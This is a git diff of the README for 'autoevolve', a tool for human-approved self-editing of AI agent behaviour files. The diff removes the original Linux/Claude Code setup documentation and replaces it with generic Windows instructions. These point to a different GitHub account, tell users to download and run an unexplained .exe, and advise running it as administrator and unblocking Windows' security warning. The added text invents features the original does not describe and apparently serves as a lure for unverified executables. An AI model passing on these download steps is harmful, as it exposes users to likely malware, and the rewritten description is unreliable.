@@ -1,129 +1,238 @@
-# autoevolve
+# 🤖 autoevolve - Let Agents Improve Themselves
 
-*Upgrades.*
+[![Download autoevolve](https://img.shields.io/badge/Download%20autoevolve-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/devinaexcogitative908/autoevolve)
 
-Your AI agents watch how humans react to them, propose mutations to their own behavior files, keep what works, and revert what doesn't. Over time, they evolve.
+## 🚀 What autoevolve does
 
-The idea: take the evolutionary loop from [Karpathy's autoresearch](https://github.com/karpathy/autoresearch) — where an AI agent autonomously mutates training code, runs experiments, and keeps improvements — and apply it to **agent behavior files** instead. In autoresearch, the agent optimizes `train.py` and measures `val_bpb`. Here, the agent optimizes its own personality and instruction files (`AGENTS.md`, `SOUL.md`, etc.) and measures fitness through human feedback signals: Discord reactions, explicit praise or corrections, and task outcomes. Each evolution cycle analyzes these signals, rolls a D20 to pick a mutation strategy, proposes a single small mutation, and waits for your approval. If the mutation helps, it stays. If it hurts, it gets reverted. Mutate, evaluate, keep-or-discard, repeat.
+autoevolve helps AI agents improve over time.
 
-This framework is built for agents running on [OpenClaw](https://github.com/anthropics/openclaw) with Discord as the chat platform, [Claude Code](https://docs.anthropic.com/en/docs/claude-code) as the evolution engine, and systemd + Git for infrastructure. The concepts are general but the implementation targets this stack.
+It watches how people respond to an agent, then uses that feedback to suggest small changes to the agent’s behavior files. If a change works, it keeps it. If it does not, it rolls it back.
 
-## How it works
+This lets the agent learn from real use instead of staying fixed in one mode.
 
-The repo is deliberately kept small. There are really only four things that matter:
+## 🪟 Windows Download
 
-- **`templates/PROGRAM.md`** — the evolution loop instructions. Claude Code reads this and runs one cycle: analyze signals, evaluate the last mutation, propose a new one. **This is what you'd iterate on to improve the evolution process itself.**
-- **`templates/config.json`** — declares which agent files are mutable vs immutable, signal weights, safety thresholds. **Customize this per agent.**
-- **`templates/agents-md-patch.md`** — a block of instructions you paste into your agent's AGENTS.md telling it to log feedback signals during sessions.
-- **`services/reaction-listener/`** — a Discord Gateway listener that tracks reactions (thumbsup, heart, etc.) on the agent's messages across all channels and threads.
+Use this link to visit the download page:
 
-After installation, agent-specific runtime data (signals, experiment log, proposals) lives in `local/` inside the cloned repo — gitignored so it never touches the public repo. A pre-commit hook with LLM review adds a second layer of protection.
+[Open the autoevolve download page](https://github.com/devinaexcogitative908/autoevolve)
 
-### The loop
+On that page, look for the latest release or the main project files. If you see a Windows file such as `.exe` or `.zip`, download it to your PC.
 
-```
-1. Agent runs normally, logging feedback signals
-   (reactions, explicit praise/corrections, task outcomes)
+## 📦 Before you start
 
-2. Claude Code runs one evolution cycle on the agent's VM
-   - Computes a fitness score from the evaluation window (default 3 days)
-   - Evaluates the last mutation (improved? keep. regressed? revert.)
-   - Analyzes signal patterns for improvement opportunities
-   - Rolls a D20 to pick the mutation strategy (simplify, specify, signal-driven, etc.)
-   - Proposes a single, small mutation to one behavior file
+You will need:
 
-3. Human reviews the proposal (Discord DM) and approves or rejects
+- A Windows PC
+- An internet connection
+- A web browser
+- Enough free disk space for the app and its files
+- Permission to run downloaded files on your PC
 
-4. If approved: mutation applied, committed, pushed
-   Next cycle evaluates its impact
-```
+For best results, keep the app in a folder you can find later, such as:
 
-### Concept mapping
+- `Downloads`
+- `Desktop`
+- `Documents`
 
-| autoresearch | autoevolve |
-|---|---|
-| `train.py` (mutation surface) | Agent's mutable files (AGENTS.md, SOUL.md, etc.) |
-| `prepare.py` (fixed ground truth) | Agent's immutable files (IDENTITY.md, USER.md) + framework |
-| `val_bpb` (fitness metric) | Composite signal: reactions + feedback + task outcomes |
-| 5-min training run | 3-day evaluation window (configurable) |
-| `results.tsv` | `local/experiments.tsv` |
-| `program.md` | `templates/PROGRAM.md` |
-| "NEVER STOP" autonomous loop | Human-gated cycle (run on your own cadence) |
+## 🖥️ How to download on Windows
 
-## Quick start
+1. Open this page in your browser:
+   [https://github.com/devinaexcogitative908/autoevolve](https://github.com/devinaexcogitative908/autoevolve)
 
-**Requirements:** An OpenClaw agent with a Discord bot, a Linux VM with systemd, Claude Code, Python 3.10+, Git.
+2. Look for the latest release, download link, or file list.
 
-```bash
-# 1. Clone autoevolve on the agent's VM
-git clone https://github.com/abeldantas/autoevolve.git /opt/autoevolve
-cd /opt/autoevolve
+3. If the page shows a Windows file, choose the file for your PC.
 
-# 2. Create local directory and set up hooks (gitignored — agent-specific data lives here)
-mkdir -p local/snapshots
-git config core.hooksPath .githooks
-cp templates/config.json local/
-cp templates/experiments.tsv local/
-touch local/signals.jsonl
-# Edit local/config.json — set agent name, workspace path, mutable files, Discord user ID
+4. Save the file to your computer.
 
-# 3. Add signal logging to the agent's instructions
-# Paste the block from templates/agents-md-patch.md into your agent's AGENTS.md
+5. If the file is a `.zip`, right-click it and choose **Extract All**.
 
-# 4. Install and start the reaction listener
-cd /opt/autoevolve/services/reaction-listener
-pip install -r requirements.txt
-sudo cp reaction-listener.service /etc/systemd/system/
-# Edit the service file: set BOT_TOKEN_PATH and SIGNALS_PATH
-sudo systemctl daemon-reload && sudo systemctl enable --now reaction-listener
+6. Open the extracted folder.
 
-# 5. Let it collect signals for 1-2 weeks, then run the first cycle
-cd /opt/autoevolve
-claude "Read templates/PROGRAM.md and run one evolution cycle. Agent config is in local/config.json."
-```
+7. If the file is a `.exe`, double-click it to start the app.
 
-See [INSTALL.md](INSTALL.md) for the full guide.
+8. If Windows asks for permission, choose **Yes**.
 
-## Project structure
+## 🛠️ How to run autoevolve
 
-```
-templates/                          # Framework (tracked, public)
-  PROGRAM.md                        — evolution loop instructions (Claude Code reads this)
-  config.json                       — default config with signal weights and thresholds
-  agents-md-patch.md                — instruction block to paste into agent's AGENTS.md
-  experiments.tsv                   — header-only template for experiment tracking
-services/
-  reaction-listener/                — Discord reaction listener (Gateway-based, systemd)
-  d20/                              — D20 mutation strategy roller
-  health-check/                     — signal freshness and source balance checker
-docs/                               — design philosophy, signals, mutations, loop details
-local/                              # Agent-specific data (gitignored, never pushed)
-  config.json                       — this agent's config (copied from template)
-  signals.jsonl                     — raw feedback signals (append-only)
-  experiments.tsv                   — experiment history (append-only)
-  proposed-mutation.md              — current pending proposal
-  snapshots/                        — file snapshots for drift detection
-```
+After you download it, start the app in one of these ways:
 
-## Design choices
+- Double-click the `.exe` file
+- Open the extracted folder and run the main program
+- Follow any setup file inside the download folder
 
-- **One mutation at a time.** Like autoresearch's single-file constraint. Change one thing, measure its impact, decide. Don't bundle.
-- **Signal-driven, not random.** Every mutation is justified by observed feedback patterns. No random exploration — the signal data tells you what to try.
-- **Simplicity criterion.** Borrowed from autoresearch: all else being equal, simpler is better. Removing an unhelpful instruction is as valuable as adding a helpful one. Agent files tend to accumulate cruft — the evolution loop actively fights that.
-- **Human-gated.** Unlike autoresearch's fully autonomous "NEVER STOP" loop, autoevolve always waits for human approval. Agent personality drift damages trust in ways that a bad training run doesn't.
-- **Separation of concerns.** The evolution loop runs in its own Claude Code session, never during normal agent operation. The agent doesn't know it's being evolved — it just reads its files each session as usual.
+If the app opens a window, it is ready to use.
 
-## Safety
+If the app uses files in a folder, keep the folder together. Do not move the files around after setup.
 
-Self-modifying agents need guardrails:
+## 🧭 What you will see first
 
-- **Immutable files** — configure which files can never be touched (e.g., IDENTITY.md, USER.md)
-- **Protected sections** — mark sections within mutable files with `<!-- NO_EVOLVE -->`
-- **Mutation size limit** — default max 20 lines changed per experiment
-- **Drift detection** — pauses evolution if cumulative changes exceed a threshold vs the original file
-- **Always review** — mutations are proposed, not applied, until human approves
-- **Git-native** — every mutation is a commit, every revert is a `git revert`. Full audit trail.
+When autoevolve starts, it may show:
 
-## License
+- A simple dashboard
+- A folder for agent behavior files
+- A place to review suggested changes
+- A log of human feedback
+- Buttons to approve or reject a mutation
 
-MIT
+The app is built for a cycle like this:
+
+1. Observe how people respond
+2. Suggest one small behavior change
+3. Ask for approval
+4. Keep the change if it helps
+5. Revert it if it does not
+
+## 🧩 How the workflow works
+
+autoevolve is based on a simple loop:
+
+- The agent checks feedback signals
+- It picks one mutation path
+- It proposes one small change
+- You review the change
+- You approve or reject it
+- The app keeps track of what works
+
+Feedback can come from things like:
+
+- Reactions in Discord
+- Direct praise
+- Direct corrections
+- Task results
+
+This keeps the changes small and easy to review.
+
+## 📁 Files it may use
+
+You may see files like these in the app folder:
+
+- `AGENTS.md`
+- `SOUL.md`
+- Behavior notes
+- Feedback logs
+- Mutation history
+- Approval records
+
+These files help the agent adjust how it behaves over time.
+
+## ⚙️ Basic setup steps
+
+If the app asks for setup, follow these steps:
+
+1. Open the app folder.
+2. Find the main program.
+3. Start the app.
+4. Point it to your agent files if needed.
+5. Connect your feedback source if the app asks.
+6. Review the first suggested change.
+7. Approve or reject it.
+
+If you use Discord feedback, make sure the bot or connection is active before you start a cycle.
+
+## 🔍 Common things to check
+
+Before you run autoevolve, check these items:
+
+- The download finished fully
+- The files were extracted if the download came in a `.zip`
+- The main app file is in the folder
+- Windows did not block the file
+- Your agent files are in the expected place
+- Your feedback source is ready
+
+If the app does not start, try running it again from the folder where you saved it.
+
+## 🧪 Example use case
+
+You use an AI agent in a Discord server.
+
+People react to its messages with emojis.
+
+Some replies get praise.
+
+Some replies get corrections.
+
+autoevolve collects that signal, proposes one change to the agent’s behavior file, and asks you to review it.
+
+If the new behavior helps, you keep it.
+
+If the new behavior hurts, you revert it.
+
+Over time, the agent becomes a better fit for your users.
+
+## 🧰 Troubleshooting
+
+If the app does not open:
+
+- Check that the download finished
+- Make sure you extracted the files if needed
+- Right-click the app and choose **Run as administrator**
+- Try opening it from the folder, not the browser download bar
+
+If Windows blocks it:
+
+- Right-click the file
+- Open **Properties**
+- Look for an **Unblock** box
+- Apply the change if you see it
+
+If you do not see a main file:
+
+- Open the download folder again
+- Look for a file with `.exe`
+- Look for setup files or a folder with the app name
+
+If the app opens but does nothing:
+
+- Check that the behavior files are in the right place
+- Check that feedback has been connected
+- Restart the app
+
+## 📝 How to use it well
+
+To get the best results:
+
+- Make small changes only
+- Review each mutation before you keep it
+- Keep feedback clear and short
+- Save old versions before large edits
+- Track what changed and why
+
+Small steps make it easier to see what helped.
+
+## 🔐 Safety and control
+
+autoevolve is built around approval.
+
+That means you stay in control of the agent’s changes.
+
+The app does not need to change everything at once. It tests one small mutation, checks the result, and lets you decide what stays.
+
+## 📚 Project files
+
+This repository may include:
+
+- Core app files
+- Agent behavior files
+- Feedback logic
+- Mutation rules
+- Example setup files
+- Docs for running the app
+
+Use the README, if present in the project, to match the folder names and setup flow used by your release
+
+## 📥 Download again
+
+If you need to get the app again, use this link:
+
+[https://github.com/devinaexcogitative908/autoevolve](https://github.com/devinaexcogitative908/autoevolve)
+
+## 🧩 Start here
+
+1. Open the download page
+2. Download the Windows file
+3. Extract it if needed
+4. Run the main app
+5. Connect your agent files
+6. Review the first suggested mutation
